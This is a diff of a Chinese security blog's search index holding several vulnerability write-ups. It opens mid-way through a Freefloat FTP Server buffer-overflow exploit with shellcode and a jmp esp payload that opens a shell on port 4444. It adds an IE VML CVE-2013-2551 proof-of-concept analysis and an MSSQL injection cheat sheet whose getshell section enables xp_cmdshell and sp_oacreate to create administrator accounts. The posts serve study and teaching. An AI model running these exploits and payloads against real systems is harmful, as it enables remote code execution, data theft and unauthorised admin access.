class="string">&quot;\xa2\x65\xc0\x68\x1c\x9b\x19\xec\x67\x1f\xc6\xcd\x66\x9e\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x4d\xb0\x55\x72\xc9\xe4\x09\x25\x87\x52\xec\x9f\x69\x0c&quot;</span></span><br><span class="line"><span class="string">&quot;\xa6\x4c\x20\xd8\x3f\xbf\xf3\x9e\x3f\xea\x85\x7e\xf1\x43\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x3e\x04\xd4\xfa\x22\xb4\x1b\xd1\xe6\xc4\x51\x7b\x4e\x4d&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\xee\xd2\x10\xbf\xc5\x11\x2d\x3c\xef\xe9\xca\x5c\x9a\xec&quot;</span></span><br><span class="line"><span class="string">&quot;\x97\xda\x77\x9d\x88\x8e\x77\x32\xa8\x9a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x77d29353 -&gt; jmp esp</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xfc</span>-<span class="number">1</span>) + <span class="string">&quot;\x53\x93\xd2\x77&quot;</span> + <span class="string">&quot;\x90&quot;</span>*<span class="number">16</span> + shellcode</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注：shellcode前16个\x90是因为函数返回时的retn 8需要跳过，也可作为滑板，同时作为缓冲区防止执行shellcode时更改内存使得shellcode执行代码也被更改</p>
-</blockquote>
-<p>执行流程：</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/27.png?raw=true" style="zoom:80%">
-
-<p>栈帧结构：</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/28.png?raw=true" style="zoom:80%">
-
-<p>Shellcode使靶机开放4444端口进行shell连接攻击机，连接成功</p>
-<img src="https://github.com/hqz66/My_picture/blob/master/ftpserver1.0/29.png?raw=true" style="zoom:80%">
-
-<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
-<li><a href="https://www.exploit-db.com/exploits/23243">https://www.exploit-db.com/exploits/23243</a></li>
-<li><a href="https://giantbranch.blog.csdn.net/article/details/53291788">https://giantbranch.blog.csdn.net/article/details/53291788</a></li>
-<li><a href="https://www.youtube.com/watch?v=i6Br57lh4uE">https://www.youtube.com/watch?v=i6Br57lh4uE</a></li>
-<li><a href="https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://rj45mp.github.io/Freefloat-FTP-Server1-0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>二进制安全</category>
-      </categories>
-      <tags>
-        <tag>栈溢出</tag>
-        <tag>漏洞分析</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>EFS Web Server 7.2远程代码执行漏洞分析</title>
     <url>/2021/04/20/EFS-Web-Server-7-2%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="一、漏洞描述"><a href="#一、漏洞描述" class="headerlink" title="一、漏洞描述"></a>一、漏洞描述</h2><ul>
@@ -552,9 +290,184 @@
         <category>二进制安全</category>
       </categories>
       <tags>
-        <tag>漏洞分析</tag>
         <tag>远程代码执行</tag>
+        <tag>漏洞分析</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>CVE-2013-2551漏洞分析</title>
+    <url>/2021/05/24/CVE-2013-2551%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
+<li>漏洞编号：CVE-2013-2551</li>
+<li>漏洞类型：整数溢出<span id="more"></span>
+<h3 id="2-概述"><a href="#2-概述" class="headerlink" title="2. 概述"></a>2. 概述</h3></li>
+</ul>
+<h2 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h2><h3 id="1-分析环境"><a href="#1-分析环境" class="headerlink" title="1. 分析环境"></a>1. 分析环境</h3><ul>
+<li>win7 x86 sp1</li>
+<li>windbg</li>
+<li>IDA PRO</li>
+<li>IExplore 8</li>
+</ul>
+<h3 id="2-背景知识"><a href="#2-背景知识" class="headerlink" title="2. 背景知识"></a>2. 背景知识</h3><p>Vector Markup Language (VML)是基于xml文件格式用于显示二维矢量图像的。</p>
+<p>标记使用的是XML扩展，需要一个namespace(命名空间)，可以使用惯用的“v”作为命名空间，而在这里，它的用处是把命名空间“v”和系统预定义的行为VML连接。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:v</span>=<span class="string">&quot;urn:schemas-microsoft-com:vml&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="css">v\:* &#123; Behavior: <span class="built_in">url</span>(<span class="string">#default#VML</span>) &#125;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>VML标记，shape可以为Oval(圆)，Line(线)等图形。 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/shape-element--vml">Shape</a> 元素内可以定义 <a href="https://docs.microsoft.com/zh-cn/windows/win32/vml/msdn-online-vml-stroke-element">Stroke</a>元素：用来定义shape的笔划，stroke的属性 DashStyle 用于指定描边的点线和虚线图案，正是存在漏洞的属性</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">v:shape</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v:stroke</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:shape</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h3><p>获取POC，触发漏洞</p>
+<p>开启页堆，重新调试，进程出现地址访问错误</p>
+<img src="https://i.loli.net/2021/08/18/qTjRadhk8KJUEec.png" style="zoom:80%;" />
+
+<p>栈回溯</p>
+<img src="https://i.loli.net/2021/08/18/vhBTKMA8rZRkfE1.png" style="zoom:80%;" />
+
+<p>在vgx!ORG::GET 函数下断点，重新调试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sxe ld vgx.dll   #使程序加载vgx.dll的时候断下</span><br><span class="line">bp vgx!ORG::Get</span><br></pre></td></tr></table></figure>
+
+<p>IDA加载VGX.dll，查看ORG::Get函数</p>
+<img src="https://i.loli.net/2021/08/18/nM51GtFeWimofEB.png" style="zoom:80%;" />
+
+<p>结合windbg调试，a1是一个this指针指向vftable，程序将a1的内容进行计算得到源地址，并赋值给a2，由于经a1得到的地址访问错误导致崩溃。因此需要找到改变vftable内容的函数</p>
+<img src="https://i.loli.net/2021/08/18/cURBtPO4MegWaId.png" style="zoom:80%;" />
+
+<p>这里无法找到漏洞成因，那么需要继续栈回溯到vgx!COALineDashStyleArray::get_item，由于函数的第一个参数是this指针，上一个调用函数不在vgx.dll中，回溯意义不大。</p>
+<img src="https://i.loli.net/2021/08/18/qSnUJC9e7vcwAbg.png" style="zoom:80%;" />
+
+<p>可以推断两个ORG::Get和get_item函数都是用于触发异常，简单的回溯无法判断漏洞位置，应该从poc入手</p>
+<h4 id="POC分析"><a href="#POC分析" class="headerlink" title="POC分析"></a>POC分析</h4><p>在创建好vml元素的命名空间后，调用函数createRects()，创建vml元素数组。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建vml元素数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">		rect_array[i] = <span class="built_in">document</span>.createElement(<span class="string">&quot;v:shape&quot;</span>)</span><br><span class="line">		rect_array[i].id = <span class="string">&quot;rect&quot;</span> + i.toString()</span><br><span class="line">		<span class="built_in">document</span>.body.appendChild(rect_array[i])</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并定义两个vml元素vml1和shape，按钮button绑定点击事件crashme()，触发漏洞</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke id=<span class="string">&quot;vml1&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;v:oval&gt;</span><br><span class="line">	&lt;v:stroke dashstyle=<span class="string">&quot;2 2 2 0 2 2 2 0&quot;</span> id=<span class="string">&quot;shape&quot;</span> /&gt;</span><br><span class="line">&lt;/v:oval&gt;</span><br><span class="line">&lt;input value=<span class="string">&quot;crash!!!&quot;</span> type=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;crashme();&quot;</span>&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<p>crashme()将a数组元素设置为之前创建的v:shape数组的RuntimeStyle，最后设置vml1的dashstyle长度为44即0x2C</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i] = <span class="built_in">document</span>.getElementById(<span class="string">&quot;rect&quot;</span> + i.toString())._vgRuntimeStyle;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x400</span>; i++) &#123;</span><br><span class="line">	a[i].rotation;                                                   <span class="comment">//create a COARuntimeStyle</span></span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;                                                <span class="comment">//allocate an ORG array of size 0x2c</span></span><br><span class="line">		vml1.dashstyle = <span class="string">&quot;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后 dashstyle 数组长度被置为-1，显然造成了整数溢出漏洞，导致调用get_item()引发数组越界访问，触发漏洞。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br><span class="line">shape.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>存在整数溢出的函数一定与dashstyle有关，在Functions window搜索dashstyle，找到最可疑的函数，windbg下断点</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bp vgx!COALineDashStyleArray::put_length</span><br></pre></td></tr></table></figure>
+
+
+
+<img src="https://i.loli.net/2021/08/18/z86itLpGTKeECno.png" style="zoom:80%;" />
+
+<p>命中断点后单步运行，程序调用CElements获取DashStyleArray对象的长度，返回值eax=2c，正是poc中vml1.dashstyle数组长度，保存在this指针里</p>
+<img src="https://i.loli.net/2021/08/18/sfKSp6F2qJMRvXL.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/O9ufwMzdBmeog3b.png" style="zoom:80%;" />
+
+<p>接着获取第二个参数FFFF即-1，计划将数组长度设置为目标长度-1。如果当前长度0x2c大于目标长度-1，则调用DeleteRange将多余的元素删除，使得数组长度等于目标长度</p>
+<img src="https://i.loli.net/2021/08/18/Rp38OqA7L5XzHca.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/sgnJj1QSV5N6T4z.png" style="zoom:80%;" />
+
+<p>对应的 IDA 反编译代码位于COALineDashStyleArray::put_length()</p>
+<img src="https://i.loli.net/2021/08/18/1xori9kKzbgduwF.png" style="zoom:80%;" />
+
+<p>依次跟进DeleteRange()、MsoDeletePx()、MsoFRemovePx()，这三个函数的参数都相同，第一个this指针，第二个目标长度，第三个是需要删除的范围，即当前长度减目标长度</p>
+<img src="https://i.loli.net/2021/08/18/AGvIckwuhyn35WJ.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/oI2EzTcYyOtfZWD.png" style="zoom:80%;" />
+
+<p>导致漏洞的位置在MsoFRemovePx()。进行调试，程序首先获取this指针</p>
+<img src="https://i.loli.net/2021/08/18/oulzL2SWmvbAkhR.png" style="zoom:80%;" />
+
+<p>获取数组每个单位的长度，这里是int，4个字节</p>
+<img src="https://i.loli.net/2021/08/18/8ewyScdYNt1JPzW.png" style="zoom:80%;" />
+
+<p>[esi+0Ch]为数组首地址，数组首地址+目标长度*每个单位长度 = 数组需要删除的部分首地址</p>
+<img src="https://i.loli.net/2021/08/18/yuJFL7afo8gqBlm.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/WMvbp76e8NSyYwF.png" style="zoom:80%;" />
+
+<img src="https://i.loli.net/2021/08/18/le7OFNoAxISd6hU.png" style="zoom:80%;" />
+
+<p>对应c语言代码，v5 = 数组需要删除的部分首地址，主要执行了第10行和第11行两条语句，接下来跳过if语句</p>
+<img src="https://i.loli.net/2021/08/18/cQgIFMVzEYk2O6p.png" style="zoom:80%;" />
+
+<p>然后动态调试的部分c语言代码：</p>
+<img src="https://i.loli.net/2021/08/18/dHbiUOwqhLlk3EA.png" style="zoom:80%;" />
+
+<p>这个if语句也不满足，跳转指向更新数组长度的语句，更新前vftable中保存的长度为2c，更新后长度为ffff，易造成数组访问越界</p>
+<img src="https://i.loli.net/2021/08/18/4Po6SZKxdQjkqyH.png" style="zoom:80%;" />
+
+
+
+<h2 id="四、参考文献"><a href="#四、参考文献" class="headerlink" title="四、参考文献"></a>四、参考文献</h2><ul>
+<li>《漏洞战争》</li>
+</ul>
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>整数溢出</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MSSQL注入</title>
+    <url>/2021/09/19/MSSQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="mssql数据库"><a href="#mssql数据库" class="headerlink" title="mssql数据库"></a>mssql数据库</h2><p>mssql注入语句，以及getshell方法</p>
+<span id="more"></span>
+
+<h3 id="mssql简介"><a href="#mssql简介" class="headerlink" title="mssql简介"></a>mssql简介</h3><ul>
+<li>mssql默认端口1433，</li>
+<li>mssql自带4个系统数据库master、model、msdb、tempdb，和2个实例数据库ReportServer、ReportServerTempDB</li>
+<li>其中系统数据库master最重要，记录了mssql的各种对象信息</li>
+<li>每个数据库都有sysobjects、syscolumns，syscolumns中name是列名，sysobjects三个属性最为重要<ul>
+<li>name：表名</li>
+<li>xtype：表的类型，U为用户表，S为系统表</li>
+<li>id：用于连接sysobjects表名和syscolumns的列名</li>
+</ul>
+</li>
+<li>与mysql类似，sql server中每个数据库都有information_schema视图，可从中查询表名和列名等信息</li>
+<li>注释符–和/**/</li>
+<li>mssql三个权限：<ul>
+<li>sa：mssql最高权限</li>
+<li>db：管理员权限</li>
+<li>public：普通用户权限</li>
+</ul>
+</li>
+</ul>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="权限判断"><a href="#权限判断" class="headerlink" title="权限判断"></a>权限判断</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># sa权限</span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;sysadmin&#x27;</span>);</span><br><span class="line"># db权限</span><br><span class="line"><span class="keyword">select</span> is_member(<span class="string">&#x27;db_owner&#x27;</span>);</span><br><span class="line"># public权限</span><br><span class="line"><span class="keyword">select</span> is_srvrolemember(<span class="string">&#x27;public&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>master的sysdatabases表保存着所有数据库的信息，从中获取数据库名，dbid表示数据库编号，从零开始</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库名</span><br><span class="line"><span class="keyword">select</span> db_name();</span><br><span class="line"># 读取sysdatabases</span><br><span class="line"><span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">&gt;</span><span class="number">4</span> <span class="keyword">for</span> xml path;</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 读取information_schema表</span><br><span class="line"><span class="keyword">select</span> quotename(table_name) <span class="keyword">from</span> INFORMATION_SCHEMA.tables <span class="keyword">for</span> XML PATH(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"># 读取sysobjects</span><br><span class="line"><span class="keyword">select</span> quotename(name) <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">for</span> xml path;</span><br></pre></td></tr></table></figure>
+<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 读取information_schema</span><br><span class="line"><span class="keyword">select</span> quotename(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">for</span> xml path;</span><br><span class="line"># 读取syscolumns</span><br><span class="line"><span class="keyword">select</span> quotename(name) <span class="keyword">from</span> test..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="keyword">for</span> xml path;</span><br></pre></td></tr></table></figure>
+
+<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>以获取表名为例</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 读取information_schema</span><br><span class="line">len((<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;table_1&#x27;</span>)))<span class="operator">&gt;</span><span class="number">5</span></span><br><span class="line">ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;table_1&#x27;</span>)), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">117</span></span><br><span class="line"># 读取sysobject</span><br><span class="line">ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;table_1&#x27;</span>)), <span class="number">1</span>, <span class="number">1</span>))<span class="operator">=</span><span class="number">117</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>waitfor delay ‘0:0:5’，延时5秒</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 判断数据库名长度</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> if( len((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">&gt;</span><span class="number">6</span>))<span class="operator">&gt;</span><span class="number">3</span>  ) waitfor delay <span class="string">&#x27;0:0:5&#x27;</span> <span class="comment">--</span></span><br><span class="line"># 获取数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> if(ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name  <span class="keyword">from</span> master..sysdatabases <span class="keyword">where</span> dbid<span class="operator">&gt;</span><span class="number">6</span>), <span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">116</span>) waitfor delay <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>sql server在将nvarchar值转换成int类型时会失败，报错并将查询的值输出</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 获取当前数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(db_name())</span><br><span class="line"># 获取所有数据库名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master..sysdatabases <span class="keyword">FOR</span> XML PATH(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"># 获取表名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">for</span> XML PATH(<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"># 获取列名</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> test..syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> test..sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="keyword">for</span> xml path)</span><br></pre></td></tr></table></figure>
+<h2 id="mssql-getshell"><a href="#mssql-getshell" class="headerlink" title="mssql_getshell"></a>mssql_getshell</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>首先，判断xp_cmdshell存储过程是否存在，且一定要sa权限</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 判断xp_cmdshell是否存在，<span class="number">1</span>则存在，<span class="number">0</span>不存在</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name <span class="operator">=</span> <span class="string">&#x27;xp_cmdshell&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>开启xp_cmdshell，在SQL Server 2005之前版本中，xp_cmdshell是默认开启的，之后的版本中则默认禁止，如果有sa权限可以用sp_configure开启它</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 允许修改高级参数</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"># 打开xp_cmdshell扩展</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+<p>配置完成即可执行系统命令</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;net user hqz 123456 /add&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell <span class="string">&#x27;net localgroup administrators hqz /add&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<h3 id="sp-oacreate"><a href="#sp-oacreate" class="headerlink" title="sp_oacreate"></a>sp_oacreate</h3><p>如果xp_cmdshell组件被删除了话，还可以使用COM组件的sp_oacreate来进行执行系统命令，前提有sa权限。首先判断其是否存在</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 判断sp_oacreate存在</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> master.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;x&#x27;</span> <span class="keyword">and</span> name<span class="operator">=</span><span class="string">&#x27;SP_OACREATE&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>开启sp_oacreate</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; </span><br><span class="line">RECONFIGURE; </span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>, <span class="number">1</span>; </span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 添加管理员账户</span><br><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@js</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;ScriptControl&#x27;</span>,<span class="variable">@js</span> <span class="keyword">OUT</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OASetProperty <span class="variable">@js</span>, <span class="string">&#x27;Language&#x27;</span>, <span class="string">&#x27;JavaScript&#x27;</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@js</span>, <span class="string">&#x27;Eval&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;var o=new ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#x27;</span></span><br><span class="line"></span><br><span class="line"># 执行系统命令</span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@shell</span> <span class="type">int</span></span><br><span class="line"><span class="keyword">exec</span> sp_oacreate <span class="string">&#x27;wscript.shell&#x27;</span>, <span class="variable">@shell</span> <span class="keyword">out</span></span><br><span class="line"><span class="keyword">exec</span> sp_oamethod <span class="variable">@shell</span>, <span class="string">&#x27;run&#x27;</span> , <span class="keyword">null</span>, <span class="string">&#x27;cmd /c &quot;net user test 123456 /add&quot; &#x27;</span></span><br></pre></td></tr></table></figure>
+<p><a href="https://f5.pm/go-26046.html">更多getshell方式</a></p>
+<p>参考链接</p>
+<ul>
+<li><a href="https://cloud.tencent.com/developer/article/1668918">https://cloud.tencent.com/developer/article/1668918</a></li>
+<li><a href="https://blog.csdn.net/qq_36119192/article/details/88679754">https://blog.csdn.net/qq_36119192/article/details/88679754</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
   </entry>
   <entry>
     <title>PCMan FTP Server缓冲区溢出CVE-2013-4730漏洞分析</title>
@@ -674,8 +587,8 @@
         <category>二进制安全</category>
       </categories>
       <tags>
-        <tag>栈溢出</tag>
         <tag>漏洞分析</tag>
+        <tag>栈溢出</tag>
       </tags>
   </entry>
   <entry>
@@ -864,6 +777,155 @@
       </categories>
   </entry>
   <entry>
+    <title>Freefloat FTP Server1.0栈溢出漏洞分析</title>
+    <url>/2021/03/31/freefloatftpserver1.0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><h3 id="1-漏洞简述"><a href="#1-漏洞简述" class="headerlink" title="1. 漏洞简述"></a>1. 漏洞简述</h3><ul>
+<li>漏洞名称：Freefloat FTP server – ‘USER’ Remote Buffer Overflow</li>
+<li>漏洞编号：EDB-ID 23243</li>
+<li>漏洞类型：栈溢出</li>
+<li>漏洞影响：远程代码执行</li>
+<li>利用难度：Esay</li>
+</ul>
+<span id="more"></span>
+<h3 id="2-组件概述"><a href="#2-组件概述" class="headerlink" title="2. 组件概述"></a>2. 组件概述</h3><p>freefloatftpserver1.0 用于打开ftp服务，用于上传文件和管理有线及无线设备的软件</p>
+<h3 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3. 漏洞影响"></a>3. 漏洞影响</h3><p>freefloatftpserver1.0</p>
+<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1. 环境搭建"></a>1. 环境搭建</h3><ul>
+<li>靶机环境：Windows xp sp3</li>
+<li>靶机配置：<ul>
+<li> freefloatftpserver1.0</li>
+<li> Immunity Debugger</li>
+<li> Mona</li>
+</ul>
+</li>
